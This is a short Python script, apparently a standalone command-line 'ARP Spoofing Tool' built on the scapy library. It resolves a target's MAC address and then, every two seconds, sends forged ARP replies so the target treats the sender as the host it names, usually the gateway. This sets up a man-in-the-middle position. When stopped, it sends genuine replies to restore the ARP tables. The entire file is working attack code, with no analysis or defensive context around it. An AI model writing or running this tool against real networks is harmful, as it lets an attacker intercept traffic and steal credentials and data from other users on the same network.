#!/usr/bin/env python3
import argparse
from scapy.all import send, ARP, Ether, srp
import time

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Could not find MAC address for {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(packet, verbose=False)

def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(packet, count=4, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("target_ip", help="IP address of the target machine")
    parser.add_argument("host_ip", help="IP address of the host machine (usually the gateway)")
    args = parser.parse_args()

    target_ip = args.target_ip
    host_ip = args.host_ip

    try:
        while True:
            spoof(target_ip, host_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        restore(target_ip, host_ip)
        print("ARP spoofing stopped.")

if __name__ == "__main__":
    main()
